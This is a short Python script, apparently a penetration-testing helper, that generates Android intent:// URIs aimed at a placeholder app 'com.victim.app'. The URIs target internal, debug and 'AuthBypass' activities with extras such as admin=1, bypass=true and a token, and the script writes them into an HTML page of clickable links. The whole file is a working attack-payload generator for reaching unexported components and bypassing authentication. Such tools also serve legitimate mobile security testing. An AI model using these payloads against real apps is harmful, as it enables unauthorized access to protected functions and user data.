def generate_intent_payloads(target_package, components, extras):
    payloads = []

    for component in components:
        for key, value in extras.items():
            uri = (
                "intent://dummy#Intent;"
                f"scheme=myapp;"
                f"package={target_package};"
                f"component={target_package}/{component};"
                f"S.{key}={value};"
                "end"
            )
            payloads.append(uri)
    return payloads


def generate_html(payloads, output_file="intent_payloads.html"):
    html = [
        "<!DOCTYPE html>",
        "<html>",
        "<head><meta charset='UTF-8'><title>Intent URI Test Links</title></head>",
        "<body>",
        "<h2>Generated intent:// payloads</h2>",
        "<ul>"
    ]

    for uri in payloads:
        html.append(f'<li><a href="{uri}">{uri}</a></li>')

    html += [
        "</ul>",
        "</body>",
        "</html>"
    ]

    with open(output_file, "w", encoding="utf-8") as f:
        f.write("\n".join(html))

    print(f"[+] HTML test file written to: {output_file}")


if __name__ == "__main__":
    target_package = "com.victim.app"
    components = [
        ".InternalActivity",
        ".DebugActivity",
        ".AuthBypassActivity"
    ]

    extras = {
        "admin": "1",
        "bypass": "true",
        "token": "secret123"
    }

    payloads = generate_intent_payloads(target_package, components, extras)

    print("=== Generated intent:// payloads ===\n")
    for p in payloads:
        print(p + "\n")

    generate_html(payloads)
